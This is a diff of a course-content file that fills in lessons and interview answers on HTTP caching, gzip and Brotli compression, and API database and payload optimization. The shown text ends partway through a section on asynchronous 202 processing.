+                            {
+                                question: "What is the cache stampede problem and how do you solve it?",
+                                answer: "Cache stampede (thundering herd): Popular cache entry expires → 1000 concurrent requests all miss cache → all query database simultaneously → database overwhelmed! Solutions: 1) Lock-based: First request gets lock and refreshes cache, others wait. Use Redis SETNX for distributed lock. 2) Probabilistic early expiration: Refresh before expiration with random probability (e.g., when 90% of TTL passed, 50% chance of refresh). 3) Stale-while-revalidate: Serve stale data while asynchronously refreshing in background. Prevents spike, users get instant response. Most practical: probabilistic or stale-while-revalidate."
+                            },
+                            {
+                                question: "Explain ETags and how they work with conditional requests. Why does GitHub not count 304 responses against rate limits?",
+                                answer: "ETag: Version identifier for resource (hash of content). Flow: 1) GET /resource → Server returns ETag: 'abc123', 2) Client caches data+ETag, 3) Next request: If-None-Match: 'abc123', 4) Server checks: unchanged → 304 Not Modified (no body), changed → 200 + new data + new ETag. Benefits: Saves bandwidth (304 has no body), validates freshness. GitHub doesn't count 304 against rate limit because: No computational work (just ETag comparison), no data transfer, encourages proper cache usage, rewards good API citizens. Always store and send ETags to save quota!"
+                            },
+                            {
+                                question: "What's the difference between Cache-Control: no-cache and no-store?",
+                                answer: "no-cache: Must revalidate with server before using cached copy. Confusing name - it DOES cache but checks freshness first! Flow: Browser has cached copy → makes conditional request (If-None-Match with ETag) → server responds 304 if fresh or 200 if stale. Use for: data that changes occasionally but want to save bandwidth via 304. no-store: Don't cache at all, not in browser, not in CDN, nowhere. Every request goes to server. Use for: sensitive data (passwords, credit cards, personal info). Summary: no-cache = cache but verify freshness, no-store = never cache. Most APIs use max-age (expires after time) not no-cache."
+                            },
+                            {
+                                question: "What is the Vary header and why is it important?",
+                                answer: "Vary tells caches to store separate versions based on request headers. Vary: Accept-Encoding → separate cache for gzip, brotli, uncompressed. Vary: Accept-Language → separate per language (en, es, fr). Vary: Authorization → don't share between users. Without Vary: Cache might return English to Spanish user, or gzipped to client that doesn't support compression! Common bug: Missing Vary causes wrong cached version served. Example: Response varies by language → must include Vary: Accept-Language. Best practice: Always add Vary for any header that affects response content."
+                            },
+                            {
+                                question: "When should you NOT cache data?",
+                                answer: "Don't cache: 1) Personalized data: Different for each user (unless per-user cache keys). 2) Real-time data: Stock prices, live scores, inventory that changes constantly. 3) Sensitive data: Credit cards, passwords, PII (security/compliance risk). 4) Frequently changing: Shopping cart, session data (cache overhead > benefit). 5) Large objects: Videos, huge files (use CDN instead). Examples: Cache user profile (✅ changes rarely), don't cache shopping cart (❌ changes constantly), cache product list (✅ same for all), don't cache checkout token (❌ sensitive). Consider freshness requirements and data size when deciding."
+                            }
+                        ]
                     },
                     {
                         id: 'compression',
                         title: 'Response Compression',
                         duration: '35 min',
                         content: `
-                            <h2>OUTLINE: Compression</h2>
+                            <h2>Why Response Compression?</h2>
+                            <p>Response compression reduces the size of API responses sent over the network, improving performance and reducing bandwidth costs.</p>
 
-                            <h3>Topics to Cover:</h3>
+                            <div class="code-block">Without compression:
+JSON response: 100 KB
+Transfer time: 100 KB / 1 Mbps = 0.8 seconds
+
+With gzip compression (70% reduction):
+Compressed: 30 KB
+Transfer time: 30 KB / 1 Mbps = 0.24 seconds
+→ 3.3x faster!
+
+Benefits:
+✅ Faster response times (especially on slow networks)
+✅ Reduced bandwidth costs (cloud providers charge per GB)
+✅ Better mobile experience (limited data plans)
+✅ Improved SEO (page speed is ranking factor)
+
+Example savings:
+1 million API calls × 100 KB each = 100 GB
+With compression (70%) = 30 GB
+Savings: 70 GB × $0.09/GB (AWS) = $6.30 per million calls</div>
+
+                            <h2>Compression Algorithms</h2>
+
+                            <h3>gzip (GNU zip)</h3>
+                            <div class="code-block">Most widely supported compression algorithm
+
+Compression ratio: ~60-70% for text
+Speed: Fast compression and decompression
+Support: All browsers since 1999
+
+Example:
+Original JSON: 100 KB
+gzipped: 30 KB (70% reduction)
+
+Typical compression by content type:
+JSON: 60-80% reduction
+HTML: 60-70% reduction
+CSS: 70-80% reduction
+JavaScript: 60-70% reduction
+
+Use for: Most APIs (best balance of support and compression)</div>
+
+                            <h3>Brotli (br)</h3>
+                            <div class="code-block">Newer algorithm by Google, better compression than gzip
+
+Compression ratio: ~75-80% for text (5-10% better than gzip)
+Speed: Slower compression, similar decompression
+Support: All modern browsers (2016+)
+
+Example:
+Original JSON: 100 KB
+gzipped: 30 KB (70% reduction)
+Brotli: 25 KB (75% reduction)
+
+Compression levels: 0 (fast) to 11 (best compression)
+Level 4-5: Similar speed to gzip, better compression
+Level 11: Very slow, best for static assets
+
+Use for: Static assets (pre-compress), modern clients only
+Don't use for: Dynamic content (too slow at high levels)</div>
+
+                            <h3>deflate</h3>
+                            <div class="code-block">Older algorithm, less efficient than gzip
+
+Compression: Similar to gzip but less common
+Support: All browsers
+
+⚠️ Compatibility issues (ambiguous spec)
+Some implementations incompatible with each other
+
+Recommendation: Use gzip instead (better support, no compatibility issues)</div>
+
+                            <h3>Algorithm Comparison</h3>
+                            <table>
+                                <thead>
+                                    <tr>
+                                        <th>Algorithm</th>
+                                        <th>Compression</th>
+                                        <th>Speed</th>
+                                        <th>Browser Support</th>
+                                        <th>Use Case</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td><strong>gzip</strong></td>
+                                        <td>60-70%</td>
+                                        <td>Fast</td>
+                                        <td>Universal</td>
+                                        <td>Dynamic APIs</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Brotli</strong></td>
+                                        <td>75-80%</td>
+                                        <td>Slow (high level)</td>
+                                        <td>Modern only</td>
+                                        <td>Static assets</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>deflate</strong></td>
+                                        <td>60-70%</td>
+                                        <td>Fast</td>
+                                        <td>Universal</td>
+                                        <td>Legacy (avoid)</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+
+                            <h2>Content Negotiation</h2>
+
+                            <h3>Accept-Encoding Header</h3>
+                            <div class="code-block">Client specifies supported compression algorithms
+
+Request:
+GET /api/users HTTP/1.1
+Accept-Encoding: gzip, deflate, br
+
+Server chooses best algorithm and responds:
+HTTP/1.1 200 OK
+Content-Encoding: gzip
+Content-Type: application/json
+Content-Length: 30000
+
+[compressed data]
+
+Multiple algorithms:
+Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1
+
+Quality values (q):
+br;q=1.0 → Prefer Brotli (quality 1.0)
+gzip;q=0.8 → Second choice (quality 0.8)
+*;q=0.1 → Accept any (quality 0.1)
+
+No compression:
+Accept-Encoding: identity
+or omit header entirely</div>
+
+                            <h3>Content-Encoding Header</h3>
+                            <div class="code-block">Server indicates compression used
+
+Response:
+Content-Encoding: gzip
+→ Response body is gzip compressed
+
+Content-Encoding: br
+→ Response body is Brotli compressed
+
+No header = uncompressed
+
+⚠️ IMPORTANT: Don't set Content-Length manually!
+Middleware sets it automatically after compression
+Manual Content-Length for uncompressed size → browser confused!
+
+✅ Correct:
+res.json(data);  // Middleware handles compression + Content-Length
+
+❌ Wrong:
+res.setHeader('Content-Length', originalSize);
+res.json(data);  // Compressed size differs!</div>
+
+                            <h2>When to Compress</h2>
+
+                            <h3>Compress These</h3>
+                            <div class="code-block">✅ Text-based content:
+- JSON responses (APIs)
+- HTML pages
+- CSS stylesheets
+- JavaScript files
+- XML responses
+- Plain text
+- SVG images
+
+Example compression ratios:
+JSON: 70% reduction
+{
+  "users": [
+    {"id": 1, "name": "John", "email": "john@example.com"},
+    {"id": 2, "name": "Jane", "email": "jane@example.com"}
+    // Lots of repetition → compresses well
+  ]
+}
+
+HTML: 65% reduction (lots of tags)
+CSS: 75% reduction (repetitive rules)
+JavaScript: 60% reduction (variable names repeat)</div>
+
+                            <h3>Don't Compress These</h3>
+                            <div class="code-block">❌ Already compressed formats:
+- Images: JPEG, PNG, GIF, WebP (already compressed)
+- Videos: MP4, WebM (already compressed)
+- Audio: MP3, AAC (already compressed)
+- Archives: ZIP, RAR, 7z (already compressed)
+- Compressed documents: PDF (usually compressed)
+
+Why not compress?
+- Already compressed → minimal benefit (maybe 5%)
+- CPU waste (compressing again takes time)
+- Sometimes makes file LARGER (compression overhead)
+
+Example:
+JPEG: 50 KB
+gzipped JPEG: 52 KB (WORSE!)
+
+Exception: Some PNGs with lots of transparency compress well</div>
+
+                            <h3>Minimum Size Threshold</h3>
+                            <div class="code-block">Don't compress very small responses
+
+Compression overhead:
+- CPU time to compress
+- HTTP header overhead (~20 bytes)
+
+Break-even point: ~1 KB
+
+Less than 1 KB:
+Original: 500 bytes
+Compressed: 450 bytes + 20 bytes headers = 470 bytes
+Savings: 30 bytes (not worth CPU cost)
+
+More than 1 KB:
+Original: 10 KB
+Compressed: 3 KB + 20 bytes = 3020 bytes
+Savings: 7 KB (definitely worth it!)
+
+Best practice: Only compress responses > 1 KB
+
+// Express compression middleware
+const compression = require('compression');
+app.use(compression({
+  threshold: 1024  // Only compress if > 1 KB
+}));</div>
+
+                            <h2>Implementation</h2>
+
+                            <h3>Node.js/Express</h3>
+                            <div class="code-block">// Using compression middleware
+const compression = require('compression');
+
+// Basic usage (gzip only)
+app.use(compression());
+
+// With options
+app.use(compression({
+  level: 6,           // Compression level (0-9, default 6)
+  threshold: 1024,    // Only compress > 1KB
+  filter: (req, res) => {
+    // Custom filter logic
+    if (req.headers['x-no-compression']) {
+      return false;
+    }
+    return compression.filter(req, res);
+  }
+}));
+
+// Routes after middleware
+app.get('/api/users', (req, res) => {
+  res.json(users);  // Automatically compressed if > 1KB
+});
+
+Compression levels:
+0: No compression (fastest)
+1: Fast compression (lower ratio)
+6: Default balance
+9: Best compression (slowest)
+
+For dynamic APIs: Level 6 (good balance)
+For static assets: Pre-compress at level 9</div>
+
+                            <h3>Nginx</h3>
+                            <div class="code-block"># Nginx compression config
+http {
+  gzip on;
+  gzip_vary on;
+  gzip_min_length 1024;  # Only compress > 1KB
+  gzip_comp_level 6;
+  gzip_types
+    text/plain
+    text/css
+    text/xml
+    text/javascript
+    application/json
+    application/javascript
+    application/xml+rss
+    application/rss+xml
+    image/svg+xml;
+
+  # Don't compress already compressed
+  gzip_disable "msie6";
+}
+
+# Brotli (requires module)
+brotli on;
+brotli_types text/plain text/css application/json;
+brotli_comp_level 6;</div>
+
+                            <h3>CDN Compression (CloudFront)</h3>
+                            <div class="code-block">CloudFront automatic compression:
+
+1. Enable in distribution settings
+2. CloudFront compresses responses automatically
+3. Adds Vary: Accept-Encoding header
+
+Benefits:
+✅ No server load (CDN does compression)
+✅ Cached compressed versions
+✅ Automatic based on Accept-Encoding
+
+Configuration:
+- Behavior settings → Compress Objects Automatically: Yes
+- CloudFront caches both compressed and uncompressed
+- Serves appropriate version based on Accept-Encoding
+
+Note: Only compresses if:
+- Content-Type is compressible
+- Size > 1000 bytes
+- Client sends Accept-Encoding</div>
+
+                            <h2>Performance Trade-offs</h2>
+
+                            <h3>CPU vs Bandwidth</h3>
+                            <div class="code-block">Compression uses CPU to save bandwidth
+
+Compression (server):
+CPU: ~5ms per response (level 6)
+Bandwidth saved: 70 KB (100 KB → 30 KB)
+
+Decompression (client):
+CPU: ~1ms (very fast on modern devices)
+
+Trade-off analysis:
+- Slow network: Compression worth it (70 KB saved >> 5ms CPU)
+- Fast network: Still worth it (bandwidth costs money)
+- High traffic: CPU cost multiplied by requests
+
+Example:
+1000 req/sec × 5ms CPU = 5 seconds of CPU per second
+Needs: 5 CPU cores just for compression
+
+But saves: 1000 req/sec × 70 KB = 70 MB/sec = 252 GB/hour
+At $0.09/GB = $22.68/hour savings
+
+CPU cost << Bandwidth savings!</div>
+
+                            <h3>Compression Level Impact</h3>
+                            <div class="code-block">Higher level = better compression, more CPU
+
+Level 1 (fast):
+Time: 2ms
+Compression: 55% reduction
+Throughput: 500 req/sec per core
+
+Level 6 (default):
+Time: 5ms
+Compression: 70% reduction
+Throughput: 200 req/sec per core
+
+Level 9 (best):
+Time: 50ms
+Compression: 75% reduction
+Throughput: 20 req/sec per core
+
+For dynamic APIs: Level 6 (best balance)
+For static assets: Pre-compress at level 9 offline
+
+// Pre-compress static assets (build step)
+const fs = require('fs');
+const zlib = require('zlib');
+
+fs.createReadStream('bundle.js')
+  .pipe(zlib.createGzip({ level: 9 }))
+  .pipe(fs.createWriteStream('bundle.js.gz'));
+
+// Serve pre-compressed (Nginx)
+location ~ \.js$ {
+  gzip_static on;  # Serve .js.gz if exists
+}</div>
+
+                            <h2>Best Practices</h2>
+
+                            <h3>1. Always Set Vary Header</h3>
+                            <div class="code-block">Tell caches to store separate compressed/uncompressed versions
+
+Response without Vary:
+Content-Encoding: gzip
+→ Cache stores gzipped version
+→ Serves gzipped to client without Accept-Encoding
+→ Client can't decompress!
+
+Response with Vary:
+Content-Encoding: gzip
+Vary: Accept-Encoding
+→ Cache stores both versions
+→ Serves appropriate version per client
+
+// Middleware automatically adds Vary
+app.use(compression());  // Adds Vary: Accept-Encoding
+
+// Manual
+res.setHeader('Vary', 'Accept-Encoding');</div>
+
+                            <h3>2. Compress at CDN/Proxy Level</h3>
+                            <div class="code-block">Let CDN do compression, save server CPU
+
+Origin server → Uncompressed → CDN
+CDN → Compressed → Client
+
+Benefits:
+✅ Server CPU freed up
+✅ CDN caches compressed versions
+✅ Geographic proximity (fast decompression)
+
+Configuration:
+CloudFront: Enable "Compress Objects Automatically"
+Cloudflare: Enable "Auto Minify" + Brotli
+Fastly: Enable compression in VCL config</div>
+
+                            <h3>3. Pre-compress Static Assets</h3>
+                            <div class="code-block">Compress during build, not at request time
+
+Build step:
+webpack → bundle.js (1 MB)
+gzip level 9 → bundle.js.gz (300 KB)
+brotli level 11 → bundle.js.br (250 KB)
+
+Deploy all versions to server
+
+Request time:
+Accept-Encoding: br → Serve bundle.js.br (instant)
+Accept-Encoding: gzip → Serve bundle.js.gz (instant)
+No Accept-Encoding → Serve bundle.js (instant)
+
+No runtime compression CPU cost!
+
+// Webpack plugin
+const CompressionPlugin = require('compression-webpack-plugin');
+
+module.exports = {
+  plugins: [
+    new CompressionPlugin({
+      algorithm: 'gzip',
+      test: /\.(js|css|html|svg)$/,
+      threshold: 1024,
+      minRatio: 0.8
+    }),
+    new CompressionPlugin({
+      algorithm: 'brotliCompress',
+      filename: '[path][base].br'
+    })
+  ]
+};</div>
+
+                            <h3>4. Monitor Compression Ratio</h3>
+                            <div class="code-block">Track compression effectiveness
+
+Metrics to monitor:
+- Average compression ratio (Original size / Compressed size)
+- Compression time (p50, p95, p99)
+- CPU usage (compression overhead)
+- Bandwidth savings (GB saved per day)
+
+// Monitoring middleware
+app.use((req, res, next) => {
+  const originalSend = res.send.bind(res);
+
+  res.send = function(data) {
+    const originalSize = Buffer.byteLength(data);
+
+    originalSend(data);
+
+    const compressedSize = parseInt(res.get('Content-Length')) || originalSize;
+    const ratio = (1 - compressedSize / originalSize) * 100;
+
+    console.log(\`Compression: \${originalSize} → \${compressedSize} (\${ratio.toFixed(1)}%)\`);
+  };
+
+  next();
+});
+
+Alert if compression ratio drops below threshold
+(might indicate already-compressed data being compressed)</div>
+
+                            <h2>Common Mistakes</h2>
+
+                            <h3>1. Compressing Already-Compressed Data</h3>
+                            <div class="code-block">❌ BAD: Compressing images, videos
+
+app.use(compression());  // Compresses EVERYTHING
+
+GET /api/images/photo.jpg
+→ JPEG compressed again (makes it larger!)
+
+✅ GOOD: Filter by content type
+
+app.use(compression({
+  filter: (req, res) => {
+    // Only compress text-based
+    if (req.path.match(/\.(jpg|png|gif|mp4|zip|pdf)$/)) {
+      return false;
+    }
+    return compression.filter(req, res);
+  }
+}));</div>
+
+                            <h3>2. Not Setting Vary Header</h3>
+                            <div class="code-block">❌ BAD: Cache serves gzipped to wrong client
+
+Response:
+Content-Encoding: gzip
+(no Vary header)
+
+Cache stores gzipped version
+Client without Accept-Encoding gets gzipped response
+→ Browser can't display!
+
+✅ GOOD: Always include Vary
+
+Content-Encoding: gzip
+Vary: Accept-Encoding
+
+Cache stores separate versions per encoding</div>
+
+                            <h3>3. Setting Wrong Content-Length</h3>
+                            <div class="code-block">❌ BAD: Manual Content-Length before compression
+
+const data = JSON.stringify(users);
+res.setHeader('Content-Length', data.length);  // Wrong!
+res.send(data);  // Middleware compresses it
+→ Content-Length is for uncompressed, body is compressed!
+
+✅ GOOD: Let middleware handle it
+
+res.json(users);  // Middleware sets correct Content-Length</div>
+
+                            <h2>Summary</h2>
+                            <p>Response compression significantly improves API performance:</p>
                             <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li><strong>Compression Algorithms</strong>
-                                    - gzip (most common, ~70% reduction)
-                                    - Brotli (better compression, slower)
-                                    - deflate (older)
-                                </li>
-                                <li><strong>Accept-Encoding Header</strong>
-                                    - Client specifies support
-                                    - Content-Encoding in response
-                                    - Quality values
-                                </li>
-                                <li><strong>When to Compress</strong>
-                                    - Text-based responses (JSON, XML, HTML)
-                                    - Minimum size threshold (>1KB)
-                                    - When NOT to compress (images, videos, already compressed)
-                                </li>
-                                <li><strong>Implementation</strong>
-                                    - Middleware/server level
-                                    - CDN compression
-                                    - Trade-offs (CPU vs bandwidth)
-                                </li>
+                                <li><strong>gzip:</strong> Most common, 60-70% reduction, use for dynamic APIs</li>
+                                <li><strong>Brotli:</strong> Better compression (75-80%), slower, use for static assets</li>
+                                <li>Only compress text-based content (JSON, HTML, CSS, JS)</li>
+                                <li>Don't compress already-compressed formats (images, videos)</li>
+                                <li>Minimum threshold: 1 KB (smaller not worth CPU cost)</li>
+                                <li>Always set Vary: Accept-Encoding header for caching</li>
+                                <li>Trade-off: CPU cost vs bandwidth savings (bandwidth usually wins)</li>
+                                <li>Pre-compress static assets at build time (level 9)</li>
+                                <li>Use CDN compression to offload server CPU</li>
                             </ul>
                         `,
-                        interviews: []
+                        interviews: [
+                            {
+                                question: "What's the difference between gzip and Brotli compression?",
+                                answer: "gzip: Most widely supported (all browsers since 1999), 60-70% compression ratio, fast compression/decompression. Best for dynamic API responses. Brotli: Newer (2016+), 75-80% compression (5-10% better), slower compression at high levels but similar decompression. Best for static assets pre-compressed at build time. Example: 100KB JSON → gzip 30KB, Brotli 25KB. Use gzip for dynamic APIs (speed matters), Brotli for static assets (pre-compress once offline). All modern browsers support both but gzip has universal support including old browsers."
+                            },
+                            {
+                                question: "Why should you NOT compress images and videos?",
+                                answer: "Images (JPEG, PNG) and videos (MP4) are already compressed using specialized algorithms optimized for visual data. Compressing again: 1) Minimal benefit (maybe 5% or often makes it LARGER), 2) Wastes CPU (compression takes time), 3) Double decompression on client (slower). Example: 50KB JPEG → gzip → 52KB (worse!). Text compresses well because repetition (JSON has repeated keys, HTML has repeated tags). Images have random-looking compressed data with no repetition. Only compress text-based: JSON, HTML, CSS, JavaScript, XML. Exception: Some PNGs with lots of transparency/solid colors compress well."
+                            },
+                            {
+                                question: "Why is the Vary: Accept-Encoding header important?",
+                                answer: "Vary header tells caches to store separate versions based on Accept-Encoding. Without Vary: Cache stores ONE version (e.g., gzipped) → serves it to ALL clients → clients without gzip support get compressed data they can't decompress → broken! With Vary: Accept-Encoding: Cache stores multiple versions (gzipped, uncompressed) → serves appropriate version per client. Example: Client A (Accept-Encoding: gzip) gets gzipped, Client B (no header) gets uncompressed. CDNs, proxies, browser caches all respect Vary. Compression middleware automatically adds Vary header. Always include it when using Content-Encoding."
+                            },
+                            {
+                                question: "What is the minimum size threshold for compression and why?",
+                                answer: "Minimum threshold: ~1 KB (1024 bytes). Below this, compression overhead exceeds savings. Overhead: 1) CPU time to compress (~5ms), 2) HTTP header overhead (~20 bytes for Content-Encoding). Example <1KB: 500 bytes → compressed 450 bytes + 20 byte header = 470 bytes. Only 30 bytes saved, not worth 5ms CPU. Example >1KB: 10KB → compressed 3KB + 20 bytes = 3020 bytes. 7KB saved, definitely worth it! Most compression middleware defaults to 1KB threshold. Configure: compression({threshold: 1024}). For very high traffic APIs, might increase to 2-4KB to reduce CPU load."
+                            },
+                            {
+                                question: "What's the trade-off between compression level and performance?",
+                                answer: "Higher level = better compression but more CPU time. Level 1: 2ms, 55% reduction, 500 req/sec/core. Level 6 (default): 5ms, 70% reduction, 200 req/sec/core. Level 9: 50ms, 75% reduction, 20 req/sec/core. For dynamic APIs: Use level 6 (good balance). For static assets: Pre-compress at level 9 offline during build. Example: gzip bundle.js at level 9 once → serve pre-compressed version (0ms compression at request time). Trade-off analysis: 1000 req/sec × 5ms = 5 CPU cores. But saves 70MB/sec × $0.09/GB = $22/hour. CPU cost << bandwidth savings. Always worth it for text content."
+                            },
+                            {
+                                question: "How does CDN compression help and when should you use it?",
+                                answer: "CDN compression: Origin server sends uncompressed → CDN compresses → serves compressed to client. Benefits: 1) Frees up origin server CPU, 2) CDN caches both compressed/uncompressed versions, 3) Geographic proximity (faster), 4) One-time compression per cache entry (not per request). Configuration: CloudFront 'Compress Objects Automatically', Cloudflare Auto Minify, Fastly VCL compression. CDN only compresses if: content-type is text-based, size >1000 bytes, client sends Accept-Encoding. Best practice: Let CDN handle compression for dynamic content, pre-compress static assets yourself at build time for maximum control."
+                            }
+                        ]
                     },
                     {
                         id: 'performance-optimization',
                         title: 'API Performance Optimization',
                         duration: '45 min',
                         content: `
-                            <h2>OUTLINE: Performance Optimization</h2>
+                            <h2>Database Optimization</h2>
 
-                            <h3>Topics to Cover:</h3>
-                            <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li><strong>Database Optimization</strong>
-                                    - Indexing strategies
-                                    - N+1 query problem
-                                    - Query optimization
-                                    - Connection pooling
-                                    - Read replicas
-                                </li>
-                                <li><strong>Payload Optimization</strong>
-                                    - Sparse fieldsets (?fields=id,name)
-                                    - Pagination (avoid large responses)
-                                    - Compression
-                                    - GraphQL for flexible queries
-                                </li>
-                                <li><strong>Response Time Optimization</strong>
-                                    - Async processing (202 Accepted)
-                                    - Background jobs
-                                    - Webhooks for callbacks
-                                    - Streaming responses
-                                </li>
-                                <li><strong>Monitoring & Metrics</strong>
-                                    - Response time percentiles (p50, p95, p99)
-                                    - Error rates
-                                    - Throughput
-                                    - Resource utilization
-                                </li>
-                            </ul>
+                            <h3>The N+1 Query Problem</h3>
+                            <div class="code-block">Most common database performance problem
 
-                            <h3>Examples to Include:</h3>
+Scenario: Fetch 100 users with their posts
+
+❌ N+1 Problem (101 queries!):
+// Query 1: Get users
+SELECT * FROM users LIMIT 100;  // 100 users
+
+// Queries 2-101: Get posts for each user (loop)
+for (const user of users) {
+  user.posts = await db.query(
+    'SELECT * FROM posts WHERE user_id = ?',
+    [user.id]
+  );
+}
+
+Total: 1 query (users) + 100 queries (posts) = 101 queries!
+Time: 101 × 10ms = 1010ms
+
+✅ Solution: Eager loading with JOIN (1 query)
+SELECT users.*, posts.*
+FROM users
+LEFT JOIN posts ON posts.user_id = users.id
+WHERE users.id IN (...)
+LIMIT 100;
+
+Total: 1 query
+Time: 15ms
+
+67x faster!
+
+// ORM solution (Sequelize)
+const users = await User.findAll({
+  include: [{ model: Post }]  // Eager load
+});
+
+// Without include: N+1 problem
+// With include: Single JOIN query</div>
+
+                            <h3>Database Indexing</h3>
+                            <div class="code-block">Indexes dramatically speed up queries
+
+Without index:
+SELECT * FROM users WHERE email = 'john@example.com';
+→ Full table scan: Check every row
+→ 1 million rows: ~500ms
+
+With index on email:
+CREATE INDEX idx_users_email ON users(email);
+→ B-tree lookup: Log(n) time
+→ 1 million rows: ~5ms
+
+100x faster!
+
+When to index:
+✅ WHERE clauses (email = ?)
+✅ JOIN conditions (foreign keys)
+✅ ORDER BY columns
+✅ Frequently queried fields
+
+When NOT to index:
+❌ Rarely queried columns
+❌ High-write, low-read tables (indexes slow writes)
+❌ Small tables (<1000 rows)
+❌ Columns with low cardinality (e.g., boolean)
+
+Composite indexes:
+// Query: WHERE status = 'active' AND created_at > '2024-01-01'
+CREATE INDEX idx_status_created ON posts(status, created_at);
+
+Order matters! (status, created_at) ≠ (created_at, status)
+
+Check query performance:
+EXPLAIN SELECT * FROM users WHERE email = 'john@example.com';
+
+Look for:
+- type: 'const' or 'ref' (good, uses index)
+- type: 'ALL' (bad, full table scan)
+- rows: How many rows scanned</div>
+
+                            <h3>Query Optimization</h3>
+                            <div class="code-block">❌ BAD: SELECT *
+SELECT * FROM users WHERE id = 123;
+→ Returns all 50 columns
+→ Large payload, slow serialization
+
+✅ GOOD: Select only needed fields
+SELECT id, name, email FROM users WHERE id = 123;
+→ Returns 3 columns
+→ Faster, less memory
+
+❌ BAD: Pagination with OFFSET
+SELECT * FROM posts ORDER BY created_at DESC LIMIT 10 OFFSET 10000;
+→ Database reads 10,010 rows, discards 10,000
+→ Slow for large offsets
+
+✅ GOOD: Cursor-based pagination
+SELECT * FROM posts
+WHERE created_at < '2024-01-15T10:00:00Z'
+ORDER BY created_at DESC
+LIMIT 10;
+→ Uses index, constant time
+
+❌ BAD: OR in WHERE
+SELECT * FROM users WHERE name = 'John' OR name = 'Jane';
+→ Can't use index efficiently
+
+✅ GOOD: IN clause
+SELECT * FROM users WHERE name IN ('John', 'Jane');
+→ Can use index
+
+❌ BAD: Function in WHERE
+SELECT * FROM users WHERE YEAR(created_at) = 2024;
+→ Can't use index (function applied to column)
+
+✅ GOOD: Range query
+SELECT * FROM users
+WHERE created_at >= '2024-01-01' AND created_at < '2025-01-01';
+→ Uses index</div>
+
+                            <h3>Connection Pooling</h3>
+                            <div class="code-block">Reuse database connections instead of creating new ones
+
+Without pooling (BAD):
+Request → Create connection (100ms) → Query (10ms) → Close → Response
+Total: 110ms per request
+
+With pooling (GOOD):
+Request → Get connection from pool (1ms) → Query (10ms) → Return to pool → Response
+Total: 11ms per request
+
+10x faster!
+
+// Node.js with pg (PostgreSQL)
+const { Pool } = require('pg');
+
+const pool = new Pool({
+  host: 'localhost',
+  database: 'mydb',
+  max: 20,           // Max connections in pool
+  idleTimeoutMillis: 30000,
+  connectionTimeoutMillis: 2000,
+});
+
+// Use pool
+const result = await pool.query('SELECT * FROM users WHERE id = $1', [123]);
+
+Pool sizing:
+Too small: Requests wait for connection
+Too large: Database overwhelmed
+
+Formula: max_connections = (CPU cores × 2) + disk_spindles
+Example: 4 cores + 1 disk = 10 connections
+
+Cloud databases often limit connections:
+- Heroku Postgres hobby: 20 connections
+- AWS RDS t2.micro: 87 connections
+
+Multiple app servers share pool:
+3 servers × 20 connections = 60 total
+Make sure database supports it!</div>
+
+                            <h3>Read Replicas</h3>
+                            <div class="code-block">Separate read and write traffic for better performance
+
+Architecture:
+         ┌──────────┐
+         │  Master  │ ← Writes
+         └─────┬────┘
+               │ Replication
+        ┌──────┴──────┐
+        ↓             ↓
+    ┌───────┐    ┌───────┐
+    │ Replica│    │ Replica│ ← Reads
+    └───────┘    └───────┘
+
+Writes (20%): Go to master
+Reads (80%): Distributed across replicas
+
+Benefits:
+✅ Master handles fewer queries (not overwhelmed)
+✅ Scale reads horizontally (add more replicas)
+✅ Geographic distribution (replica closer to users)
+
+// Implementation
+const writeDB = new Pool({ host: 'master.db.com' });
+const readDB = new Pool({ host: 'replica.db.com' });
+
+// Writes
+app.post('/users', async (req, res) => {
+  await writeDB.query('INSERT INTO users ...', [data]);
+});
+
+// Reads
+app.get('/users/:id', async (req, res) => {
+  const user = await readDB.query('SELECT * FROM users WHERE id = $1', [id]);
+});
+
+Replication lag:
+- Master write → Replica update: ~100ms delay
+- User creates account → immediate read might not see it
+
+Solutions:
+1. Read from master for critical operations
+2. Accept eventual consistency
+3. Sticky sessions (same user → same replica)</div>
+
+                            <h2>Payload Optimization</h2>
+
+                            <h3>Sparse Fieldsets</h3>
+                            <div class="code-block">Let clients request only needed fields
+
+❌ Without fieldsets:
+GET /api/users/123
+→ Returns all 50 fields (name, email, bio, avatar, settings, preferences, ...)
+
+✅ With fieldsets:
+GET /api/users/123?fields=id,name,email
+→ Returns only 3 fields
+
+Response size: 10 KB → 0.5 KB (20x smaller!)
+
+// Implementation
+app.get('/api/users/:id', async (req, res) => {
+  const requestedFields = req.query.fields?.split(',') || ['*'];
+
+  let query = 'SELECT ';
+  if (requestedFields.includes('*')) {
+    query += '* ';
+  } else {
+    // Validate and sanitize fields
+    const allowedFields = ['id', 'name', 'email', 'bio'];
+    const validFields = requestedFields.filter(f => allowedFields.includes(f));
+    query += validFields.join(', ');
+  }
+  query += ' FROM users WHERE id = $1';
+
+  const user = await db.query(query, [req.params.id]);
+  res.json(user);
+});
+
+JSON:API standard:
+GET /articles?fields[articles]=title,body&fields[people]=name
+
+Benefits:
+✅ Reduces bandwidth
+✅ Faster serialization
+✅ Mobile-friendly (limited data plans)
+✅ Only fetch what you need
+
+Use case: Mobile apps (limited screen space, show summary)</div>
+
+                            <h3>Pagination</h3>
+                            <div class="code-block">Never return unbounded results
+
+❌ BAD: No pagination
+GET /api/posts
+→ Returns all 1 million posts
+→ Response size: 500 MB
+→ Response time: 30 seconds
+→ Client crashes
+
+✅ GOOD: Paginated
+GET /api/posts?limit=20&page=1
+→ Returns 20 posts
+→ Response size: 50 KB
+→ Response time: 50ms
+
+Always enforce max limit:
+const limit = Math.min(req.query.limit || 20, 100);  // Max 100
+
+// Default to reasonable size
+if (!req.query.limit) {
+  req.query.limit = 20;
+}
+
+See earlier lesson on pagination techniques (offset vs cursor)</div>
+
+                            <h2>Response Time Optimization</h2>
+
+                            <h3>Async Processing (202 Accepted)</h3>
+                            <div class="code-block">For long-running operations, respond immediately with job ID
+
+❌ Synchronous (slow):
+POST /api/reports/generate
+→ Server generates report (30 seconds)
+→ Response: Report data
+→ Client waits 30 seconds!
+
+✅ Asynchronous (fast):
+POST /api/reports/generate
+→ Server creates job, returns job ID
+← 202 Accepted: {"jobId": "abc123", "status": "processing"}
+→ Client polls or waits for webhook
+
+GET /api/jobs/abc123
+← {"status": "completed", "resultUrl": "/reports/abc123.pdf"}
+
+// Implementation
